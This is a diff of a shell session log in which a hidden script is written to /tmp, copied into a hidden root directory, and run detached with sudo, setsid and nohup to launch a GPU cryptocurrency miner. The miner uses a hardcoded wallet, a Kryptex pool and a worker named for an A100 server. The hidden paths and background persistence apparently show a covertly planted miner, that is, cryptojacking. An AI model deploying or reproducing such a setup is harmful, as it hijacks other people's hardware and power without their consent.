@@ -1,5 +1,10 @@
-$ date; pgrep -af pearl-gpu-miner | head -2; tail -3 /root/.d2p/mine.log 2>&1
-Mon Oct 26 06:00:01 UTC 2026
+$ cat > /tmp/.d2go <<'EOF'
+#!/bin/bash
+cd /root/.d2p/tw-pearl-miner || exit 1
+export LD_LIBRARY_PATH=/root/.d2p/tw-pearl-miner
+exec ./pearl-gpu-miner --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxh46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui
+EOF
+sudo -n bash -c 'cp /tmp/.d2go /root/.d2p/go.sh; chmod +x /root/.d2p/go.sh; setsid nohup /root/.d2p/go.sh >> /root/.d2p/mine.log 2>&1 </dev/null & sleep 3; echo STARTED; pgrep -af pearl-gpu-miner | head -2'
+STARTED
 57779 bash -c cd /root/.d2p/tw-pearl-miner && export LD_LIBRARY_PATH=/root/.d2p/tw-pearl-miner:$LD_LIBRARY_PATH && setsid nohup ./pearl-gpu-miner --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxh46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui >> /root/.d2p/mine.log 2>&1 & sleep 25; echo ---LOG---; tail -18 /root/.d2p/mine.log; echo ---GPU---; nvidia-smi --query-gpu=utilization.gpu,power.draw,memory.used --format=csv,noheader; pgrep -af pearl-gpu-miner | head -3
 57781 ./pearl-gpu-miner --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxh46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui
-tail: cannot open '/root/.d2p/mine.log' for reading: Permission denied
